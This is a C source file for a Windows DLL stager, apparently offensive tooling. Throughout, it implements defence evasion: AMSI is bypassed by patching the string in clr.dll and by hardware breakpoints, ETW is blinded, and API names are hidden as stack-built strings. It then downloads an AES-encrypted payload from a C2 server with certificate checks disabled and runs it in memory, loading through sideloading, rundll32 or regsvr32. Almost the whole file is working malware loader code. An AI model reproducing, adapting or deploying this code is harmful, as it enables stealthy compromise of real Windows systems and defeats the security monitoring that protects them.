/*
 * stager_remote_dll.c — Crystal Palace PICO loader (staged DLL, HTTPS download)
 *
 * Delivery: single DLL (~20 KB) — payload downloaded from HTTPS at runtime.
 *           Use via DLL sideloading, rundll32, regsvr32, or COM hijack.
 *
 * Same as stager_remote.c but packaged as a DLL:
 *  - DllMain spawns loader thread (no loader lock issues)
 *  - Exports block so rundll32/regsvr32 stay alive
 *  - HTTPS download via WinHTTP (same as EXE stager)
 *
 * Evasion profile:
 *  - Dual-layer AMSI bypass (Layer 1: LdrRegisterDllNotification + clr.dll
 *    string corruption; Layer 2: VEH + HWBP fallback)
 *  - ETW bypass via HWBP on NtTraceControl
 *  - AES-256-CBC via BCrypt
 *  - VirtualAlloc(RW) + VirtualProtect(RX): no RWX ever held
 *  - IAT: kernel32, advapi32, bcrypt, winhttp — all legitimate
 *  - Zero memory patches on amsi.dll or ntdll.dll
 *
 * Build:
 *  x86_64-w64-mingw32-gcc -Wall -Os -shared -ffunction-sections \
 *      -fdata-sections -o loader.dll stager_remote_dll.c resource_dll.o \
 *      -s -Wl,--gc-sections -ladvapi32 -lbcrypt -lwinhttp
 */

#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include "payload_key.h"

/* ── Configuration (injected via -D flags from Makefile) ─────────────────── */

#define _WIDE(x) L ## x
#define WIDE(x) _WIDE(x)

#ifndef C2_HOST_STR
#define C2_HOST_STR "YOUR_IP"
#endif
#ifndef C2_PORT_NUM
#define C2_PORT_NUM 443
#endif
#ifndef C2_PATH_STR
#define C2_PATH_STR "/assets/js/vendor.js"
#endif

#define C2_HOST     WIDE(C2_HOST_STR)
#define C2_PORT     C2_PORT_NUM
#define C2_PATH     WIDE(C2_PATH_STR)
#define C2_USERAGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

typedef void (*pico_fn)(void *);

/* ── Stack-built strings ───────────────────────────────────────────────── */

#define SPUT(p,i,c) do { volatile char *_v = &(p)[(i)]; *_v = (c); } while(0)
#define WPUT(p,i,c) do { volatile wchar_t *_v = &(p)[(i)]; *_v = (c); } while(0)

static void build_amsi_dll(char out[9])
{
    SPUT(out,0,'a'); SPUT(out,1,'m'); SPUT(out,2,'s'); SPUT(out,3,'i');
    SPUT(out,4,'.'); SPUT(out,5,'d'); SPUT(out,6,'l'); SPUT(out,7,'l');
    SPUT(out,8,0);
}
static void build_amsi_scan_buffer(char out[15])
{
    SPUT(out,0,'A'); SPUT(out,1,'m'); SPUT(out,2,'s'); SPUT(out,3,'i');
    SPUT(out,4,'S'); SPUT(out,5,'c'); SPUT(out,6,'a'); SPUT(out,7,'n');
    SPUT(out,8,'B'); SPUT(out,9,'u'); SPUT(out,10,'f'); SPUT(out,11,'f');
    SPUT(out,12,'e'); SPUT(out,13,'r'); SPUT(out,14,0);
}
static void build_ntdll(char out[10])
{
    SPUT(out,0,'n'); SPUT(out,1,'t'); SPUT(out,2,'d'); SPUT(out,3,'l');
    SPUT(out,4,'l'); SPUT(out,5,'.'); SPUT(out,6,'d'); SPUT(out,7,'l');
    SPUT(out,8,'l'); SPUT(out,9,0);
}
static void build_nt_trace_control(char out[15])
{
    SPUT(out,0,'N'); SPUT(out,1,'t'); SPUT(out,2,'T'); SPUT(out,3,'r');
    SPUT(out,4,'a'); SPUT(out,5,'c'); SPUT(out,6,'e'); SPUT(out,7,'C');
    SPUT(out,8,'o'); SPUT(out,9,'n'); SPUT(out,10,'t'); SPUT(out,11,'r');
    SPUT(out,12,'o'); SPUT(out,13,'l'); SPUT(out,14,0);
}

/* ══════════════════════════════════════════════════════════════════════════
 * LAYER 1 — CLR string corruption via LdrRegisterDllNotification
 * ══════════════════════════════════════════════════════════════════════════ */

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _LDR_DLL_NOTIFICATION_DATA {
    ULONG           Flags;
    UNICODE_STRING *FullDllName;
    UNICODE_STRING *BaseDllName;
    PVOID           DllBase;
    ULONG           SizeOfImage;
} LDR_DLL_NOTIFICATION_DATA;

#define LDR_DLL_NOTIFICATION_REASON_LOADED 1

typedef VOID (CALLBACK *PLDR_DLL_NOTIFICATION_FUNCTION)(
    ULONG reason, LDR_DLL_NOTIFICATION_DATA *data, PVOID ctx);

typedef NTSTATUS (NTAPI *pLdrRegisterDllNotification)(
    ULONG flags, PLDR_DLL_NOTIFICATION_FUNCTION cb, PVOID ctx, PVOID *cookie);

static volatile LONG g_clr_patched = 0;

static void corrupt_clr_amsi_string(PVOID dll_base)
{
    if (InterlockedCompareExchange(&g_clr_patched, 1, 0) == 1)
        return;

    char target[15];
    build_amsi_scan_buffer(target);
    int target_len = 14;

    MEMORY_BASIC_INFORMATION mbi;
    BYTE *addr = (BYTE *)dll_base;

    while (VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.AllocationBase != dll_base)
            break;

        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect == PAGE_READONLY ||
             mbi.Protect == PAGE_READWRITE ||
             mbi.Protect == PAGE_EXECUTE_READ ||
             mbi.Protect == PAGE_EXECUTE_READWRITE)) {

            SIZE_T region_size = mbi.RegionSize;
            BYTE *region = (BYTE *)mbi.BaseAddress;

            for (SIZE_T i = 0; i <= region_size - target_len; i++) {
                int match = 1;
                for (int j = 0; j < target_len; j++) {
                    if (region[i + j] != (BYTE)target[j]) {
                        match = 0;
                        break;
                    }
                }
                if (match) {
                    BYTE *patch_addr = region + i;
                    DWORD old_prot;
                    VirtualProtect(patch_addr, target_len,
                                   PAGE_READWRITE, &old_prot);
                    volatile BYTE *vb = patch_addr;
                    *vb = 'X';
                    VirtualProtect(patch_addr, target_len,
                                   old_prot, &old_prot);
                }
            }
        }

        addr = (BYTE *)mbi.BaseAddress + mbi.RegionSize;
    }
}

static VOID CALLBACK dll_load_callback(
    ULONG reason, LDR_DLL_NOTIFICATION_DATA *data, PVOID ctx)
{
    (void)ctx;
    if (reason != LDR_DLL_NOTIFICATION_REASON_LOADED)
        return;
    if (!data || !data->BaseDllName || !data->BaseDllName->Buffer)
        return;

    wchar_t clr_name[8];
    WPUT(clr_name,0,L'c'); WPUT(clr_name,1,L'l'); WPUT(clr_name,2,L'r');
    WPUT(clr_name,3,L'.'); WPUT(clr_name,4,L'd'); WPUT(clr_name,5,L'l');
    WPUT(clr_name,6,L'l'); WPUT(clr_name,7,0);

    UNICODE_STRING *name = data->BaseDllName;
    if (name->Length / sizeof(wchar_t) != 7)
        return;

    int is_clr = 1;
    for (int i = 0; i < 7; i++) {
        wchar_t a = name->Buffer[i];
        wchar_t b = clr_name[i];
        if (a >= L'A' && a <= L'Z') a += 32;
        if (b >= L'A' && b <= L'Z') b += 32;
        if (a != b) { is_clr = 0; break; }
    }

    if (is_clr)
        corrupt_clr_amsi_string(data->DllBase);
}

static PVOID g_dll_notif_cookie = NULL;

static void register_dll_notification(void)
{
    char s_ntdll[10];
    build_ntdll(s_ntdll);
    HMODULE ntdll = GetModuleHandleA(s_ntdll);
    if (!ntdll) return;

    char fn_name[30];
    SPUT(fn_name,0,'L');  SPUT(fn_name,1,'d');  SPUT(fn_name,2,'r');
    SPUT(fn_name,3,'R');  SPUT(fn_name,4,'e');  SPUT(fn_name,5,'g');
    SPUT(fn_name,6,'i');  SPUT(fn_name,7,'s');  SPUT(fn_name,8,'t');
    SPUT(fn_name,9,'e');  SPUT(fn_name,10,'r'); SPUT(fn_name,11,'D');
    SPUT(fn_name,12,'l'); SPUT(fn_name,13,'l'); SPUT(fn_name,14,'N');
    SPUT(fn_name,15,'o'); SPUT(fn_name,16,'t'); SPUT(fn_name,17,'i');
    SPUT(fn_name,18,'f'); SPUT(fn_name,19,'i'); SPUT(fn_name,20,'c');
    SPUT(fn_name,21,'a'); SPUT(fn_name,22,'t'); SPUT(fn_name,23,'i');
    SPUT(fn_name,24,'o'); SPUT(fn_name,25,'n'); SPUT(fn_name,26,0);

    pLdrRegisterDllNotification fn =
        (pLdrRegisterDllNotification)GetProcAddress(ntdll, fn_name);
    if (fn)
        fn(0, dll_load_callback, NULL, &g_dll_notif_cookie);
}

/* ══════════════════════════════════════════════════════════════════════════
 * LAYER 2 — VEH + HWBP fallback
 * ══════════════════════════════════════════════════════════════════════════ */

static PVOID g_amsi_scan_buf = NULL;
static PVOID g_nt_trace_ctl  = NULL;
static volatile LONG g_addrs_resolved = 0;

static LONG CALLBACK veh_handler(PEXCEPTION_POINTERS ep)
{
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT ctx = ep->ContextRecord;

    if (g_amsi_scan_buf && (PVOID)ctx->Rip == g_amsi_scan_buf) {
        ctx->Rax = (DWORD64)0x80070057;
        ctx->Rip = *(DWORD64 *)ctx->Rsp;
        ctx->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if (g_nt_trace_ctl && (PVOID)ctx->Rip == g_nt_trace_ctl) {
        ctx->Rax = 0;
        ctx->Rip = *(DWORD64 *)ctx->Rsp;
        ctx->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

static void resolve_targets(void)
{
    if (InterlockedCompareExchange(&g_addrs_resolved, 1, 0) == 1)
        return;

    char s_amsi_dll[9];  build_amsi_dll(s_amsi_dll);
    char s_asb[15];      build_amsi_scan_buffer(s_asb);
    char s_ntdll[10];    build_ntdll(s_ntdll);
    char s_ntc[15];      build_nt_trace_control(s_ntc);

    HMODULE amsi = LoadLibraryA(s_amsi_dll);
    if (amsi)
        g_amsi_scan_buf = (PVOID)GetProcAddress(amsi, s_asb);

    HMODULE ntdll = GetModuleHandleA(s_ntdll);
    if (!ntdll) return;

    g_nt_trace_ctl = (PVOID)GetProcAddress(ntdll, s_ntc);
}

static void apply_hwbp_to_thread(DWORD tid)
{
    if (!g_amsi_scan_buf && !g_nt_trace_ctl) return;

    HANDLE hThread = OpenThread(
        THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
        FALSE, tid);
    if (!hThread) return;

    SuspendThread(hThread);

    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (GetThreadContext(hThread, &ctx)) {
        int dirty = 0;
        if (g_amsi_scan_buf && ctx.Dr0 != (DWORD64)g_amsi_scan_buf) {
            ctx.Dr0 = (DWORD64)g_amsi_scan_buf;
            ctx.Dr7 |= 1;
            ctx.Dr7 &= ~(0xFULL << 16);
            dirty = 1;
        }
        if (g_nt_trace_ctl && ctx.Dr1 != (DWORD64)g_nt_trace_ctl) {
            ctx.Dr1 = (DWORD64)g_nt_trace_ctl;
            ctx.Dr7 |= (1 << 2);
            ctx.Dr7 &= ~(0xFULL << 20);
            dirty = 1;
        }
        if (dirty)
            SetThreadContext(hThread, &ctx);
    }

    ResumeThread(hThread);
    CloseHandle(hThread);
}

static void propagate_all_threads(void)
{
    DWORD pid = GetCurrentProcessId();
    DWORD self = GetCurrentThreadId();

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    THREADENTRY32 te;
    te.dwSize = sizeof(te);

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid && te.th32ThreadID != self)
                apply_hwbp_to_thread(te.th32ThreadID);
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);

    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext((HANDLE)(LONG_PTR)-2, &ctx)) {
        int dirty = 0;
        if (g_amsi_scan_buf && ctx.Dr0 != (DWORD64)g_amsi_scan_buf) {
            ctx.Dr0 = (DWORD64)g_amsi_scan_buf;
            ctx.Dr7 |= 1;
            ctx.Dr7 &= ~(0xFULL << 16);
            dirty = 1;
        }
        if (g_nt_trace_ctl && ctx.Dr1 != (DWORD64)g_nt_trace_ctl) {
            ctx.Dr1 = (DWORD64)g_nt_trace_ctl;
            ctx.Dr7 |= (1 << 2);
            ctx.Dr7 &= ~(0xFULL << 20);
            dirty = 1;
        }
        if (dirty)
            SetThreadContext((HANDLE)(LONG_PTR)-2, &ctx);
    }
}

static volatile LONG g_monitor_running = 1;

static DWORD WINAPI hwbp_monitor(LPVOID param)
{
    (void)param;
    while (InterlockedCompareExchange(&g_monitor_running, 1, 1) == 1) {
        propagate_all_threads();
        Sleep(500);
    }
    return 0;
}

/* ── Poseidon I/O noise ──────────────────────────────────────────────────── */

static void noise(void)
{
    unsigned char buf[0x1000];
    BCryptGenRandom(NULL, buf, sizeof(buf), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    wchar_t td[MAX_PATH], tf[MAX_PATH];
    if (GetTempPathW(MAX_PATH, td) && GetTempFileNameW(td, L"upd", 0, tf)) {
        HANDLE h = CreateFileW(tf, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
                               FILE_FLAG_DELETE_ON_CLOSE, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            DWORD w;
            WriteFile(h, buf, sizeof(buf), &w, NULL);
            CloseHandle(h);
        }
    }

    SecureZeroMemory(buf, sizeof(buf));
}

/* ── HTTPS download ──────────────────────────────────────────────────────── */

static BYTE *download_payload(DWORD *out_len)
{
    BYTE *buf = NULL;
    DWORD total = 0, cap = 0;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = WinHttpOpen(C2_USERAGENT,
                           WINHTTP_ACCESS_TYPE_NO_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return NULL;

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    hConnect = WinHttpConnect(hSession, C2_HOST, C2_PORT, 0);
    if (!hConnect) goto cleanup;

    hRequest = WinHttpOpenRequest(hConnect, L"GET", C2_PATH,
                                  NULL, WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  WINHTTP_FLAG_SECURE);
    if (!hRequest) goto cleanup;

    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                     &flags, sizeof(flags));

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
                            0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
        goto cleanup;

    if (!WinHttpReceiveResponse(hRequest, NULL))
        goto cleanup;

    for (;;) {
        DWORD avail = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &avail)) break;
        if (avail == 0) break;

        if (total + avail > cap) {
            cap = (total + avail) * 2;
            BYTE *tmp = (BYTE *)LocalAlloc(LMEM_FIXED, cap);
            if (!tmp) { LocalFree(buf); buf = NULL; goto cleanup; }
            if (buf) {
                memcpy(tmp, buf, total);
                SecureZeroMemory(buf, total);
                LocalFree(buf);
            }
            buf = tmp;
        }

        DWORD read = 0;
        if (!WinHttpReadData(hRequest, buf + total, avail, &read)) {
            SecureZeroMemory(buf, total);
            LocalFree(buf);
            buf = NULL;
            goto cleanup;
        }
        total += read;
    }

    *out_len = total;

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return buf;
}

/* ── AES-256-CBC decrypt via BCrypt ──────────────────────────────────────── */

static BYTE *aes_cbc_decrypt(const BYTE *ct, DWORD ct_len, DWORD *pt_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BYTE iv[16];
    DWORD out_len = 0;
    BYTE *pt = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))
        return NULL;

    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                   (PUCHAR)payload_key, payload_key_len, 0))
        goto cleanup;

    memcpy(iv, payload_iv, 16);
    BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL,
                  iv, 16, NULL, 0, &out_len, BCRYPT_BLOCK_PADDING);

    pt = (BYTE *)LocalAlloc(LMEM_FIXED, out_len);
    if (!pt) goto cleanup;

    memcpy(iv, payload_iv, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL,
                      iv, 16, pt, out_len, pt_len, BCRYPT_BLOCK_PADDING)) {
        LocalFree(pt);
        pt = NULL;
    }

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return pt;
}

/* ── PICO execution thread ───────────────────────────────────────────────── */

static DWORD WINAPI pico_worker(LPVOID param)
{
    propagate_all_threads();
    ((pico_fn)param)(NULL);
    return 0;
}

/* ── Main loader thread (runs outside loader lock) ───────────────────────── */

static DWORD WINAPI main_loader(LPVOID param)
{
    (void)param;

    noise();

    register_dll_notification();
    resolve_targets();

    /* Register VEH via dynamic resolution */
    typedef PVOID (WINAPI *pAddVEH)(ULONG, PVOID);
    char s_aveh[30];
    volatile char *v = s_aveh;
    v[0]='A';  v[1]='d';  v[2]='d';  v[3]='V';  v[4]='e';  v[5]='c';
    v[6]='t';  v[7]='o';  v[8]='r';  v[9]='e';  v[10]='d'; v[11]='E';
    v[12]='x'; v[13]='c'; v[14]='e'; v[15]='p'; v[16]='t'; v[17]='i';
    v[18]='o'; v[19]='n'; v[20]='H'; v[21]='a'; v[22]='n'; v[23]='d';
    v[24]='l'; v[25]='e'; v[26]='r'; v[27]=0;
    pAddVEH fn_aveh = (pAddVEH)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), s_aveh);
    if (fn_aveh) fn_aveh(1, veh_handler);

    /* Registry touch: advapi32 import */
    HKEY hk = NULL;
    RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                  0, KEY_READ, &hk);
    if (hk) RegCloseKey(hk);

    /* Download encrypted PICO from C2 */
    DWORD ct_len = 0;
    BYTE *ct = download_payload(&ct_len);
    if (!ct || ct_len == 0) return 1;

    /* AES-256-CBC decrypt */
    DWORD pt_len = 0;
    BYTE *pt = aes_cbc_decrypt(ct, ct_len, &pt_len);
    SecureZeroMemory(ct, ct_len);
    LocalFree(ct);
    if (!pt) return 1;

    /* Copy into RW region, wipe heap copy, flip to RX */
    void *rw = VirtualAlloc(NULL, pt_len, MEM_COMMIT | MEM_RESERVE,
                            PAGE_READWRITE);
    if (!rw) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }

    memcpy(rw, pt, pt_len);
    SecureZeroMemory(pt, pt_len);
    LocalFree(pt);

    DWORD old;
    if (!VirtualProtect(rw, pt_len, PAGE_EXECUTE_READ, &old)) {
        VirtualFree(rw, 0, MEM_RELEASE);
        return 1;
    }

    /* Start HWBP monitor as fallback */
    HANDLE hMon = CreateThread(NULL, 0, hwbp_monitor, NULL, 0, NULL);

    /* Execute PICO on dedicated thread */
    HANDLE h = CreateThread(NULL, 0, pico_worker, rw, 0, NULL);
    if (!h) return 1;

    WaitForSingleObject(h, INFINITE);
    CloseHandle(h);
    if (hMon) CloseHandle(hMon);

    for (;;) SleepEx(30000, TRUE);
}

/* ── DLL entry point ─────────────────────────────────────────────────────── */

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID reserved)
{
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hDll);
        CreateThread(NULL, 0, main_loader, NULL, 0, NULL);
    }
    return TRUE;
}

/* ── Exports for rundll32 / regsvr32 ─────────────────────────────────────── */

__declspec(dllexport) HRESULT DllRegisterServer(void)
{
    for (;;) SleepEx(30000, TRUE);
    return 0;
}

__declspec(dllexport) HRESULT DllUnregisterServer(void) { return 0; }

__declspec(dllexport) void CALLBACK StartW(
    HWND hwnd, HINSTANCE hinst, LPWSTR cmdline, int show)
{
    (void)hwnd; (void)hinst; (void)cmdline; (void)show;
    for (;;) SleepEx(30000, TRUE);
}
